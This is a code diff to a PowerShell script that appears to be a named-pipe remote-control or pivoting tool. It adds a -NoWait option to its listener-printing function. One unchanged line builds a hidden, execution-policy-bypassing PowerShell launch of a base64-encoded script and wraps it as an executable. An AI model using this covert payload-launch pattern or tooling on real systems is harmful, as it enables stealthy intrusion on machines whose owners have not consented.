@@ -1282,8 +1282,9 @@ while (`$true) {
 }
 
 function Print-MultiListener {
+	param ([switch]$NoWait)
 	
-    # Load necessary .NET assemblies
+	# Load necessary .NET assemblies
 	Add-Type -AssemblyName System.Core
 
 	$PN = $global:MultiPipeName
@@ -1387,7 +1388,8 @@ while (`$true) {
 		$exescript = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
 		PS1ToEXE -content $exescript -outputFile $exefilelocation
 	}
-	Start-Sleep 4
+ 	
+	if(!$NoWait){Start-Sleep 4}
 }
 
 function Scan-WaitingTargets{
@@ -1853,7 +1855,7 @@ function InteractWithPipeSession{
 		}
 		
 		elseif ($command -eq 'GListener') {
-			Print-MultiListener
+			Print-MultiListener -NoWait
 			continue
 		}
 		
@@ -1911,7 +1913,7 @@ function InteractWithPipeSession{
 			$global:MultiPipeName = $commandParts[1]
 			Write-Host ""
 			Write-Host " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]" -Foreground yellow
-			Print-MultiListener
+			Print-MultiListener -NoWait
 			continue
 		}
 		
@@ -1920,7 +1922,7 @@ function InteractWithPipeSession{
 			$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
 			Write-Host ""
 			Write-Host " [+] New Global-Listener PipeName: $global:MultiPipeName | Revert: [GLSet $OldGlobalPipeName]" -Foreground yellow
-			Print-MultiListener
+			Print-MultiListener -NoWait
 			continue
 		}
 		
